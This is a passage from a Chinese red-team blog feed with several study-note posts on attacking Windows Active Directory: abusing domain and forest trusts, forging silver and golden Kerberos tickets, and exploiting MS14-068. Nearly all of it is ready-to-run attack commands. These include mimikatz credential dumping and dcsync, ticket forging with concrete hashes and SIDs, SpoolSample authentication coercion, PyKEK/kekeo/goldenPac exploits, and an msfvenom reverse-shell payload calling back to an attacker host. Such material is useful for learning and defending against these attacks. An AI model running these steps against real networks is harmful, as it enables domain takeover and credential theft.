class="line-numbers-rows"><span></span></span></code></pre><p>枚举远程计算机的用户组，如果提示拒绝访问，说明没有信任关系</p><pre class="line-numbers language-none"><code class="language-none">lg.exe \\dc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>枚举远程计算机的用户名</p><pre class="line-numbers language-none"><code class="language-none">lg.exe \\dc -lu<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>枚举远程系统中全部用户的 SID</p><pre class="line-numbers language-none"><code class="language-none">lg.exe \\dc -lu -sidsout<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>枚举远程系统指定组中的所有成员的 SID</p><pre class="line-numbers language-none"><code class="language-none">lg.exe \\dc\administrators -lu -sidsout<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2、利用域信任密钥获取目标域权限"><a href="#2、利用域信任密钥获取目标域权限" class="headerlink" title="2、利用域信任密钥获取目标域权限"></a>2、利用域信任密钥获取目标域权限</h2><p>这里环境信息为：</p><p>父域的域控：dc.teamssix.com</p><p>子域的域控：subdc.sub.teamssix.com</p><p>子域内的计算机：user4.sub.teamssix.com</p><p>子域内的普通用户：user4</p><p>在子域的域控中使用 mimikatz 获取需要的信息</p><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe privilege::debug &quot;lsadump::lsa &#x2F;patch &#x2F;user:administrator&quot; &quot;lsadump::trust &#x2F;patch&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到当前域的 SID 、父域的 SID 和子域域管 NTLM 哈希后，在子域的普通用户机器上利用 mimikatz 制作信任票据</p><blockquote><p>这里的 sids 是父域的 sid，sids 后的 519 表示创建的用户属于父域的管理员组</p></blockquote><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe &quot;kerberos::golden &#x2F;domain:sub.teamssix.com &#x2F;sid:S-1-5-21-1655164184-1934932396-2547489287 &#x2F;sids:S-1-5-21-2230503874-1187844892-774991719-519 &#x2F;rc4:5bfd59b5e1f78a794f714af07eac869f &#x2F;user:administrator &#x2F;service:krbtgt &#x2F;target:teamssix.com &#x2F;ticket:subdc_administrator.kirbi&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 利用刚刚制作的信任票据获取目标域中目标服务的 TGS 并保存到文件中</p><pre class="line-numbers language-none"><code class="language-none">asktgs subdc_administrator.kirbi cifs&#x2F;dc.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将获取的 TGS 票据注入到内存中</p><pre class="line-numbers language-none"><code class="language-none">kirbikator lsa cifs.dc.teamssix.com.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 dir 访问目标域控</p><pre class="line-numbers language-none"><code class="language-none">dir \\dc.teamssix.com\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202110211307519.png"></p><h2 id="3、利用-krbtgt-散列值获取目标域的权限"><a href="#3、利用-krbtgt-散列值获取目标域的权限" class="headerlink" title="3、利用 krbtgt 散列值获取目标域的权限"></a>3、利用 krbtgt 散列值获取目标域的权限</h2><p>如果攻击者获取了林内任意域的 krbtgt 散列值，就可以使用 sidHistory 获得该林的完整权限。</p><p>首先获取当前子域和父域的 SID 值，可以使用以下工具或命令</p><pre class="line-numbers language-none"><code class="language-none">wmic useraccount get caption,sidwhoami &#x2F;useradfind.exe -sc u:user4 | findstr SidGet-DomainSID sub.teamssix.com  # PowerView 里的命令<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来获取子域的 krbtgt 的哈希值，使用 mimikatz 即可</p><pre class="line-numbers language-none"><code class="language-none">mimikatz privilege::debug &quot;lsadump::lsa &#x2F;patch &#x2F;user:krbtgt&quot; sekurlsa::krbtgt exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在子域普通用户权限的计算机中构造黄金票据</p><pre class="line-numbers language-none"><code class="language-none">mimikatz &quot;Kerberos::golden &#x2F;user:Administrator &#x2F;domain:sub.teamssix.com &#x2F;sid:S-1-5-21-1655164184-1934932396-2547489287 &#x2F;sids:S-1-5-21-2230503874-1187844892-774991719-519 &#x2F;krbtgt:b53a5c7c51648f033b96971e7ae4ee45 &#x2F;ptt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202110211315739.png"></p><h2 id="4、利用无约束委派和-MS-RPRN-获取信任林权限"><a href="#4、利用无约束委派和-MS-RPRN-获取信任林权限" class="headerlink" title="4、利用无约束委派和 MS-RPRN 获取信任林权限"></a>4、利用无约束委派和 MS-RPRN 获取信任林权限</h2><p>如果已经获取了域林中某个域控权限，或者配置了无约束委派的任何服务器的权限，那么就可以使用 MS RPRN 的 RpcRemoteFindPrinterChangeNotification(Ex) 方法，使信任林的域控制器向已被控制的服务器发送身份认证请求，利用捕获的票据获取信任林内任意用户的哈希值。</p><p>假设这里获取了 teamssix.com 域的域控权限，且 0day.org 与 teamssix.com 域有林信任关系</p><p>首先在 teamssix.com 的域控上监听身份认证请求</p><pre class="line-numbers language-none"><code class="language-none">rubeus.exe monitor &#x2F;interval:5 &#x2F;filteruser:OWA2010SP3$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">interval: 用于设置监控的时间间隔filteruser: 用于指定需要关注的主机，这里的 OWA2010SP3 是 0day.org 域控的主机名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>开启监听后，使用 SpoolSample 工具让 OWA2010SP3.0day.org 向 dc.teamssix.com 发送身份认证请求</p><pre class="line-numbers language-none"><code class="language-none">SpoolSample.exe OWA2010SP3.0day.org dc.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获得票据后，使用 rubeus 将票据注入内存</p><pre class="line-numbers language-none"><code class="language-none">rubeus.exe ptt &#x2F;ticket:&lt;TGT 票据&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 mimikatz 获取目标的 krbtgt 散列值</p><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe &quot;lsadump::dcsync &#x2F;domain:0day.org &#x2F;user:0day\krbtgt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来，构造黄金票据并将其注入内存，就能够获得 0day.org 域控的权限了</p><pre class="line-numbers language-none"><code class="language-none">mimikatz &quot;Kerberos::golden &#x2F;user:Administrator &#x2F;domain:0day.org &#x2F;sid:5-1-5-21-1812920812-2335051732-3517558806 &#x2F;rc4:b53a5c8c51648f053b96971e7ae4ee25 &#x2F;ptt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>参考文章：</p><p><a href="https://blog.csdn.net/qq_34640691/article/details/111881910">https://blog.csdn.net/qq_34640691/article/details/111881910</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0、前言&quot;&gt;&lt;a href=&quot;#0、前言&quot; class=&quot;headerlink&quot; title=&quot;0、前言&quot;&gt;&lt;/a&gt;0、前言&lt;/h2&gt;&lt;p&gt;常见的跨域攻击方法有以下几种：&lt;/p&gt;
&lt;p&gt;i、利用常规的渗透方法，比如 Web 漏洞&lt;/p&gt;
&lt;p&gt;ii、利用已知散列值</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】29、白银票据</title>
    <link href="https://www.teamssix.com/211009-145524.html"/>
    <id>https://www.teamssix.com/211009-145524.html</id>
    <published>2021-10-09T06:55:24.000Z</published>
    <updated>2021-11-22T08:59:49.773Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>白银票据（Sliver Ticket） 不同于黄金票据（Golden Ticket）</p><blockquote><p>Kerberos 协议详解：<a href="https://teamssix.com/210923-151418.html">https://teamssix.com/210923-151418.html</a></p></blockquote><p>白银票据不与密钥分发中心 KDC 交互，因此没有了 Kerberos 认证协议里的前 4 步，通过伪造的票据授予服务 TGS 生成伪造的服务票据  ST 直接与服务器 Server 进行交互。</p><p>白银票据与黄金票据的区别：</p><p>1、白银票据不经过 KDC，因此白银票据日志相对于黄金票据会更少，同时白银票据的日志都在目标服务器上，域控上不会有日志</p><p>2、白银票据利用服务账户的哈希值，不同于黄金票据利用 krbtgt 账户的哈希值，因此白银票据更加隐蔽，但白银票据的权限就远不如黄金票据的权限了</p><p>想利用白银票据需要先知道以下信息：</p><ul><li>域名</li><li>域 SID</li><li>目标服务器的 FQDN 即完整的域名</li><li>可利用的服务</li><li>服务账户的 NTLM 哈希</li><li>伪造的用户名即任意用户名</li></ul><h2 id="1、伪造-CIFS-服务权限"><a href="#1、伪造-CIFS-服务权限" class="headerlink" title="1、伪造 CIFS 服务权限"></a>1、伪造 CIFS 服务权限</h2><p>CIFS 服务常用于 Windows 主机之间的文件共享，首先使用 mimikatz 获取服务账户的 NTLM 哈希，这里使用的 Username 为 DC$ 的 NTLM 哈希</p><pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe log &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到 HASH 后，清空当前系统中的票据，防止其他票据干扰</p><pre class="line-numbers language-none"><code class="language-none">klist purge# 或者在 mimikatz 里清除kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用 mimikatz 生成伪造的白银票据</p><pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe &quot;kerberos::golden &#x2F;user:t &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;target:dc &#x2F;rc4:ef9e49a41feaa171f642016fd4cb7e7a &#x2F;service:cifs &#x2F;ptt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​    <img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202110091330529.png"></p><p>在伪造票据后，使用 dir 命令就能读取到目标的共享服务了。</p><h2 id="2、伪造-LDAP-服务权限"><a href="#2、伪造-LDAP-服务权限" class="headerlink" title="2、伪造 LDAP 服务权限"></a>2、伪造 LDAP 服务权限</h2><p>首先判断当前权限是否可以使用 dcsync 域控进行同步</p><pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe &quot;lsadump::dcsync &#x2F;dc:dc &#x2F;domain:teamssix.com &#x2F;user:krbtgt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果返回 ERROR 说明当前权限不能进行 dcsync 操作</p><p>接下来生成 LDAP 服务的白银票据</p><pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe &quot;kerberos::golden &#x2F;user:t &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;target:dc &#x2F;rc4:ef9e49a41feaa171f642016fd4cb7e7a &#x2F;service:ldap &#x2F;ptt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202110091403286.png"></p><blockquote><p>参考文章：</p><p><a href="https://cloud.tencent.com/developer/article/1760135">https://cloud.tencent.com/developer/article/1760135</a></p><p><a href="https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/">https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/</a></p><p>原文链接：</p><p><a href="https://teamssix.com/211009-145524.html">https://teamssix.com/211009-145524.html</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0、前言&quot;&gt;&lt;a href=&quot;#0、前言&quot; class=&quot;headerlink&quot; title=&quot;0、前言&quot;&gt;&lt;/a&gt;0、前言&lt;/h2&gt;&lt;p&gt;白银票据（Sliver Ticket） 不同于黄金票据（Golden Ticket）&lt;/p&gt;
&lt;blockquote&gt;
&lt;p</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】28、黄金票据</title>
    <link href="https://www.teamssix.com/210927-163036.html"/>
    <id>https://www.teamssix.com/210927-163036.html</id>
    <published>2021-09-27T08:30:36.000Z</published>
    <updated>2021-11-22T08:59:50.298Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>RT 在利用黄金票据（Golden Ticket）进行 PTP 票据传递时，需要先知道以下信息：</p><ul><li>伪造的域管理员用户名</li><li>完整的域名</li><li>域 SID</li><li>krbtgt 的 NTLM Hash 或 AES-256 值</li></ul><p>其中 krbtgt 用户是域自带的用户，被 KDC 密钥分发中心服务所使用，属于 Domain Admins 组。</p><p>在域环境中，每个用户账号的票据都是由 krbtgt 用户所生成的，因此如果知道了 krbtgt 用户的 NTLM Hash 或者 AES-256 值，就可以伪造域内任意用户的身份了。</p><h2 id="1、导出-krbtgt-的-NTLM-Hash"><a href="#1、导出-krbtgt-的-NTLM-Hash" class="headerlink" title="1、导出 krbtgt 的 NTLM Hash"></a>1、导出 krbtgt 的 NTLM Hash</h2><p>在 mimikatz 下执行以下命令</p><pre class="line-numbers language-none"><code class="language-none">lsadump::dcsync &#x2F;domain:teamssix.com &#x2F;user:krbtgt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里得到 krbtgt 的 NTLM Hash 为 d685b9c4fa2d318a9943ed68948af087</p><p>该命令使用的 dcsync 功能远程转储 AD 里的 ntds.dit，使用 /user 参数，可以只导出指定用户的值。</p><p>或者使用以下命令获取 krbtgt 的 NTLM Hash ，域 SID 值，但该命令无法获取 AES-256 的值</p><pre class="line-numbers language-none"><code class="language-none">privilege::debuglsadump::lsa &#x2F;patch &#x2F;user:krbtgt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="2、获取基本信息"><a href="#2、获取基本信息" class="headerlink" title="2、获取基本信息"></a>2、获取基本信息</h2><p>获取域 SID</p><pre class="line-numbers language-none"><code class="language-none">wmic useraccount get name,sid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里得到 administrator 的 SID 为  S-1-5-21-284927032-1122706408-2778656994-500，即表示当前域的 SID 就是 S-1-5-21-284927032-1122706408-2778656994</p><p>获取当前用户的 SID</p><pre class="line-numbers language-none"><code class="language-none">whoami &#x2F;user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查询域管理员账号</p><pre class="line-numbers language-none"><code class="language-none">net group &quot;domain admins&quot; &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查询域名</p><pre class="line-numbers language-none"><code class="language-none">ipconfig &#x2F;all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3、制作黄金票据"><a href="#3、制作黄金票据" class="headerlink" title="3、制作黄金票据"></a>3、制作黄金票据</h2><p>先将票据清空</p><pre class="line-numbers language-none"><code class="language-none">kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>生成票据</p><pre class="line-numbers language-none"><code class="language-none">kerberos::golden &#x2F;admin:Administrator &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;krbtgt:d685b9c4fa2d318a9943ed68948af087 &#x2F;ticket:Administrator.kiribi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>传递票据并注入内存</p><pre class="line-numbers language-none"><code class="language-none">kerberos::ptt Administrator.kiribi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4、验证权限"><a href="#4、验证权限" class="headerlink" title="4、验证权限"></a>4、验证权限</h2><p>退出 mimikatz ，使用 dir 发现可以成功列出域控文件</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109271559013.png"></p><p>这里使用 PsExec 也同样是能获取到权限的，除了上面使用 NTLM Hash 之外，还可以使用 krbtgt 的 AES-256 值生成黄金票据</p><pre class="line-numbers language-none"><code class="language-none">kerberos::golden &#x2F;admin:Administrator &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;aes256:3dfa1f9b5809250a7670c12d1e109f0acb9660f902da8aa3a4be55a16affbbd5 &#x2F;ticket:Administrator.kiribi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>命令完成之后，也会生成一个 Administrator.kiribi 文件，之后的操作就都一样了。</p><h2 id="5、MSF-下的利用"><a href="#5、MSF-下的利用" class="headerlink" title="5、MSF 下的利用"></a>5、MSF 下的利用</h2><p>首先上线一个普通用户，然后加载 kiwi 模块</p><pre class="line-numbers language-none"><code class="language-none">load kiwi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>生成黄金票据</p><pre class="line-numbers language-none"><code class="language-none">golden_ticket_create -d teamssix.com -k d685b9c4fa2d318a9943ed68948af087 -s S-1-5-21-284927032-1122706408-2778656994 -u administrator -t &#x2F;root&#x2F;administrator.ticket<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将黄金票据注入内存</p><pre class="line-numbers language-none"><code class="language-none">kerberos_ticket_use &#x2F;root&#x2F;administrator.ticket<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注入成功后，进入 Shell 就能查看 dc 里的文件了</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109271628454.png"></p><blockquote><p>参考文章：</p><p><a href="https://www.freebuf.com/articles/web/274035.html">https://www.freebuf.com/articles/web/274035.html</a></p><p>原文链接：</p><p><a href="https://teamssix.com/210927-163036.html">https://teamssix.com/210927-163036.html</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0、前言&quot;&gt;&lt;a href=&quot;#0、前言&quot; class=&quot;headerlink&quot; title=&quot;0、前言&quot;&gt;&lt;/a&gt;0、前言&lt;/h2&gt;&lt;p&gt;RT 在利用黄金票据（Golden Ticket）进行 PTP 票据传递时，需要先知道以下信息：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】27、Kerberos 域用户提权漏洞</title>
    <link href="https://www.teamssix.com/210924-100520.html"/>
    <id>https://www.teamssix.com/210924-100520.html</id>
    <published>2021-09-24T02:05:20.000Z</published>
    <updated>2021-11-22T08:59:49.391Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>在 2014 年微软修复了 Kerberos 域用户提权漏洞，即 MS14-068，CVE 编号为 CVE-2014-6324，该漏洞影响了 Windows Server 2012 R2 以下的服务器，该漏洞允许 RT 将任意用户权限提升至域管级别。</p><p>不过从漏洞年代就知道这已经是个远古时代的漏洞，现实中已经很少会碰到了，这里就简单记录下，顺便熟悉熟悉工具的用法。</p><p>14-068 产生的原因主要在于用户可以利用伪造的票据向认证服务器发起请求，如果用户伪造域管的票据，服务端就会把拥有域管权限的服务票据返回回来。</p><h2 id="1、PyKEK"><a href="#1、PyKEK" class="headerlink" title="1、PyKEK"></a>1、PyKEK</h2><p>PyKEK 是一个利用 Kerberos 协议进行渗透的工具包，下载地址：<a href="https://github.com/mubix/pykek">https://github.com/mubix/pykek</a></p><p>使用 PyKEK 可以生成一个高权限的服务票据，之后通过 mimikatz 将服务票据导入到内存中。</p><p>MS 14-068 的补丁为：KB3011780，通过 wmic 查看补丁情况</p><pre class="line-numbers language-none"><code class="language-none">wmic qfe get hotfixid | findstr KB3011780<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看当前用户 SID</p><pre class="line-numbers language-none"><code class="language-none">whoami &#x2F;user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用 wmic </p><pre class="line-numbers language-none"><code class="language-none">wmic useraccount get name,sid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>生成高权限票据，-d 指定域控地址</p><pre class="line-numbers language-none"><code class="language-none">python2 ms14-068.py -u jack@0day.org -s S-1-5-21-1812960810-2335050734-3517558805-1133 -d 192.168.3.142 -p Aa123456<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>打开 mimikatz 清除当前内存中的票据信息</p><pre class="line-numbers language-none"><code class="language-none">kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将高权限票据注入内存</p><pre class="line-numbers language-none"><code class="language-none">kerberos::ptc &quot;TGT_jack@0day.org.ccache&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 net use 连接域控后，使用 psexec 获取 Shell</p><blockquote><p>这里 net ues 使用 IP 可能会失败，因此在此使用机器名进行连接 </p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109231733653.png"></p><h2 id="2、GoldenPac"><a href="#2、GoldenPac" class="headerlink" title="2、GoldenPac"></a>2、GoldenPac</h2><p>goldenPac.py 是一个用于对 Kerberos 协议进行测试的工具，它集成在 impacket 工具包里。</p><p>Kali 在使用之前需要先安装 Kerberos 客户端</p><pre class="line-numbers language-none"><code class="language-none">apt-get install krb5-user -y<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用 goldenPac.py 获取 Shell</p><pre class="line-numbers language-none"><code class="language-none">python3 goldenPac.py 0day.org&#x2F;jack:Aa123456@OWA2010SP3.0day.org<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>这里使用 IP 进行连接会连接不成功，只能使用主机名，因此可以在 hosts 文件中添加主机名对应的 IP</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109231746641.png"></p><p>goldenPac.py 是通过 PsExec 获得 Shell 的，因此会产生大量的日志，而且现在这种连接方式也已经被各大杀软所拦截。</p><h2 id="3、kekeo"><a href="#3、kekeo" class="headerlink" title="3、kekeo"></a>3、kekeo</h2><p>kekeo 也是一个工具集，其中包含了 ms14-068 的利用模块，kekeo 下载地址：<a href="https://github.com/gentilkiwi/kekeo">https://github.com/gentilkiwi/kekeo</a></p><p>使用之前需要先清除票据</p><pre class="line-numbers language-none"><code class="language-none">klist purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后直接使用 kekeo 生成高权限票据</p><pre class="line-numbers language-none"><code class="language-none">kekeo.exe &quot;exploit::ms14068 &#x2F;domain:0day.org &#x2F;user:jack &#x2F;password:Aa123456 &#x2F;ptt&quot; &quot;exit&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后就可以直接 dir 域控或者 PsExec 连接到域控了</p><h2 id="4、MSF"><a href="#4、MSF" class="headerlink" title="4、MSF"></a>4、MSF</h2><p>MSF 中也有 MS 14-086 的提权 EXP，不过需要结合 mimikatz 进行利用</p><pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;admin&#x2F;kerberos&#x2F;ms14_068_kerberos_checksumset domain 0day.orgset password Aa123456set user jackset user_sid  S-1-5-21-1812960810-2335050734-3517558805-1133set rhosts OWA2010SP3.0day.orgrun<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>设置好域名、域控 IP、密码、用户、SID 后运行，将会获取一个 bin 文件</p><p>由于 MSF 里不支持 bin 文件的导入，因此需要 mimikatz 对其进行格式转换</p><pre class="line-numbers language-none"><code class="language-none">kerberos::clist &quot;20210923061821_default_192.168.3.142_windows.kerberos_484249.bin&quot; &#x2F;export<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后，生成一个木马</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;172.16.214.74 lport&#x3D;4444 -f exe &gt; shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将木马复制到目标主机上，并使其上线到 MSF</p><p>获得会话后，将刚才 mimikatz 转换后的 kirbi 文件导入到会话中</p><pre class="line-numbers language-none"><code class="language-none">load kiwikerberos_ticket_use &#x2F;tmp&#x2F;0-00000000-jack@krbtgt-0DAY.ORG.kirbibackground<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>之后使用 current_user_psexec 模块</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;local&#x2F;current_user_psexecset session 2set rhosts OWA2010SP3.0day.orgset payload windows&#x2F;meterpreter&#x2F;reverse_tcpset lhost 172.16.214.74run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后就会返回高权限的会话</p><blockquote><p>不过 MSF 在使用过程中报错了，网上一查发现别人也有这个错误，暂时还不清楚解决的方法</p></blockquote><h2 id="5、CS"><a href="#5、CS" class="headerlink" title="5、CS"></a>5、CS</h2><p>先利用前面的 ms14-068.py 生成一个 ccache 文件，之后使用 KrbCredExport 将 ccache 文件转为 kirbi 格式</p><p>KrbCredExport 下载地址：<a href="https://github.com/rvazarkar/KrbCredExport">https://github.com/rvazarkar/KrbCredExport</a></p><pre class="line-numbers language-none"><code class="language-none">python2 KrbCredExport.py TGT_jack@0day.org.ccache user.ticket<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接着使用 CS 的 kerberos_ticket_use 加载 ticket，之后就能访问到域控了</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109240943968.png"></p><p>此时想让域控上线自然也是没问题的了，可以先添加一个域控地址的 target，然后选择 PsExec ，勾选上 use session’s current access token 通过 jack 的会话上线即可。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109241000974.png"></p><blockquote><p>参考文章：</p><p><a href="https://www.jianshu.com/p/27730ab4a6db">https://www.jianshu.com/p/27730ab4a6db</a></p><p><a href="https://www.cnblogs.com/websecyw/p/11835830.html">https://www.cnblogs.com/websecyw/p/11835830.html</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0、前言&quot;&gt;&lt;a href=&quot;#0、前言&quot; class=&quot;headerlink&quot; title=&quot;0、前言&quot;&gt;&lt;/a&gt;0、前言&lt;/h2&gt;&lt;p&gt;在 2014 年微软修复了 Kerberos 域用户提权漏洞，即 MS14-068，CVE 编号为 CVE-2014-632</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>Kerberos 协议详解与利用</title>
    <link href="https://www.teamssix.com/210923-151418.html"/>
    <id>https://www.teamssix.com/210923-151418.html</id>
    <published>2021-09-23T07:14:18.000Z</published>
    <updated>2021-11-22T08:59:49.391Z</updated>
    
